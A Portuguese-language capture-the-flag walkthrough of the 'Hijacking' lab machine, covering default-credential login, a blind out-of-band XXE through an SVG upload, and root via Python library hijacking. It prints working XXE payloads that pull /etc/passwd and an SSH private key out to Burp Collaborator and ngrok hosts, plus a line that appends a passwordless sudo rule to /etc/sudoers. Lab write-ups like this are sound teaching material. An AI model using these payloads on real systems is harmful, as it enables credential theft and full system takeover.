# Hijacking.

---

Eaí, gente! Nesta resolução de máquina de hoje, vamos resolver a machine **Hijacking** da crowsec. Vamos nos deparar com um XXE OOB e um lib hijacking em python! Sem mais enrolação, vamos começar! 🤠

```jsx
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.29
```

Como vimos, há somente duas portas abertas, a **SSH** e **HTTP**. Vamos agora enumerar a porta web e ver o que encontramos de bom! 

### **Enumeração web.** 🔍

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled.png)

Como exibido acima, nós nos deparamos com uma interface de autenticação administrativa. Ao ler o "**Admin Panel**", eu logo de cara penso em uma possibilidade de **default credentials** no site. Feito isso, eu testei as credenciais **admin:admin** e .. deu certo! 🙀

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%201.png)

Ao nos logarmos, nos deparamos agora com uma sessão de adição de comentários no website. Ao colocarmos algo aleatório e interceptarmos a requisição com o BurpSuite, nos é exibido a seguinte request:

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%202.png)

Como você pôde observar, ele puxa uma requisição POST com um valor **xml**! Ao ver isso, pensei instantaneamente na possibilidade de um **XXE**. Vamos tentar!

### **XML External Entity.** 🦊

**XML External Entity**, popularmente conhecido pela sigla **XXE**, é uma falha grave que permite ao invasor a **leitura de arquivos** do servidor, e em alguns casos, forjar as requisições então feitas por ele (**SSRF**), e até mesmo resultar em um **Remote Code Execution**. A vulnerabilidade ocorre porque servidor **não valida** o XML imposto pelo atacante como algo malicioso e controlável. Como o XML possui permissão server side utilizando a opção **SYSTEM** do XML, nós podemos assim, ler arquivos de dentro do server.

```xml
<?xml version="1.0"?>
<!DOCTYPE teste [
<!ENTITY site SYSTEM "http://l3p4nz7oamh2s0t1xhrwkohi79dz1o.burpcollaborator.net/">]>
<aa><resultado>&site;</resultado></aa>
```

Acima está o payload que eu utilizei para validar a existência do XXE. Explicando de maneira simplificada, eu crio um **ENTITY** com permissão de **SYSTEM**, e o mesmo irá mandar uma requisição pro meu **BurpSuite Collaborator**. Feito isso, eu criptografei utilizando URLEncode e adivinhem? Recebi uma requisição! ☠️

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%203.png)

Sucesso! A falha foi encontrada e validada! Vamos agora partir para a exploração do mesmo.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE teste [<!ENTITY arquivo SYSTEM "file:///etc/passwd"> ]>
<name>
 <author>marchosias</author>
 <comment>&ent;</comment>
</name>
```

Como vimos acima, o XML irá, supostamente, puxar o arquivo de senhas **/etc/passwd** do servidor e nos retornará o resultado do mesmo. Feito isso, vamos enviar para o BurpSuite! 

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%204.png)

Como vimos, nada nos é retornado 😰 .. Mas nem tudo está perdido. Agora, nós estamos tratando de um **BLIND XXE**. O que é isso, afinal? O termo "blind", traduzido do inglês para "cego", significa que nós vamos explorar a vulnerabilidade num contexto onde não veremos o resultado de maneira direta, refletida na index. Ademais, existem formas de você conseguir visualizar o resultado do payload, e nós vamos utilizar de uma técnica chamada de **Out Of Band Exfiltration** utilizando o Collabator.

### XXE OOB com SVG rasterization. 🍄

Primeiramente, para que nos contextualizemos melhor, vamos saber o que é SVG. **SVG** é uma extensão de **imagem** que aceita códigos XML em seu corpo, conforme exibido abaixo:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % site SYSTEM "http://7bb9-177-37-177-236.ngrok.io/xxe.xml">
%site;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">se inscreve no canal</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

Como vimos nas primeiras linhas do arquivo,  há um código em XML. Interpretando-o, ele cria um ENTITY chamado "**site**", onde o mesmo possui privilégios de SYSTEM, e ele será responsável por puxar o arquivo **xxe.xml** lcoalizado no meu ngrok. Vamos ver o que tem no arquivo **xxe.xml**!

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ei0x2smhpfwv7t8uca6pzhwbm2sugj.burpcollaborator.net/%data;'>">
```

Como vemos, o arquivo possui dois ENTITYS. O primeiro, intitulado de **data**, será responsável por **puxar** o arquivo **/etc/passwd** e criptografá-lo em **BASE64**. Feito isso, há outro ENTITY chamado de **param1**. O param1 será responsável por puxar o ENTITY **data** (e esse mesmo ENTITY vai puxar o arquivo /etc/passwd) para dentro do meu BurpSuite Collaborator. Feito isso, o resultado do ENTITY **data** (o mesmo que vai criptografar em b64 o /etc/passwd) vai aparecer nas requisições capturadas pelo Collaborator! Vamos ver na prática!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%205.png)

Note que ele capturou o arquivo **xxe.xml**:

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%206.png)

E, olhando para o Collaborator:

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%207.png)

Descriptografando o base64, ele nos retorna o arquivo que foi especificado!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%208.png)

```xml
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
suporte:x:1001:1001:,,,:/home/suporte:/bin/bash
```

### **Pegando shell!** 😶‍🌫️

Como vimos na última linha do arquivo /etc/passwd, ele nos exibe um usuário **suporte**. Feito isso, eu modifiquei o arquivo **xxe.xml** para nos retornar o arquivo **/home/suporte/.ssh/id_rsa**:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/home/suporte/.ssh/id_rsa">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ei0x2smhpfwv7t8uca6pzhwbm2sugj.burpcollaborator.net/%data;'>">
```

E, fazendo o mesmo esquema, ele nos retornou o id_rsa em base64! Basta descriptografá-lo!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%209.png)

Pois é, alegria de pobre dura pouco. A chave RSA veio com senha. Para isso, eu vou utilizar um script disponibilizado pela ferramenta **John**, o **ssh2john**. O mesmo altera o valor do id_rsa para um algorítimo de hash que o john consiga quebrar. Smboora!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%2010.png)

E, conseguimos credenciais de chave RSA! Com isso, vamos nos autenticar.

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%2011.png)

### **Escalação de Privilégios.** 🐍

Ao executarmos um **sudo -l**, ele nos retorna algo bem interessante:

```xml
Matching Defaults entries for suporte on ip-10-9-2-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User suporte may run the following commands on ip-10-9-2-12:
    (root) NOPASSWD: /usr/bin/python3.6 /opt/vert.py
```

Como vimos, nós podemos executar como root o script **/opt/vert.py**. Vamos ver o conteúdo do arquivo!

```python
import os

class Vector:
   def __init__(self, a, b):
      self.a = a
      self.b = b

   def __str__(self):
      return 'Vector (%d, %d)' % (self.a, self.b)
   
   def __add__(self,other):
      return Vector(self.a + other.a, self.b + other.b)

v1 = Vector(2,10)
v2 = Vector(5,-2)
print(v1 + v2)
```

Percebemos que não há nada demais no script em si, exceto algo que me chamou bastante atenção: a lib **os**. Feito isso, eu pensei na possibilidade de um **Library Hijacking Privilege Escalation**, onde nós vamos alterar a library os para um código de reverse shell. Como nós vamos executar como root, nós receberemos a reverse shell rootada! Vamos lá!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%2012.png)

```python
open("/etc/sudoers", "a").write("suporte ALL=(ALL) NOPASSWD: ALL")
```

O que eu fiz praticamente foi abrir o arquivo **/etc/sudoers** e adicionei o meu usuário dentro dele, e especifiquei que ele pode rodar qualquer comando como root sem autenticação de senha. Feito isso, rodei somente um **sudo su**, e .. peguei root!

![Untitled](Hijacking%206ac706b6cc614111a8c65575a1e87471/Untitled%2013.png)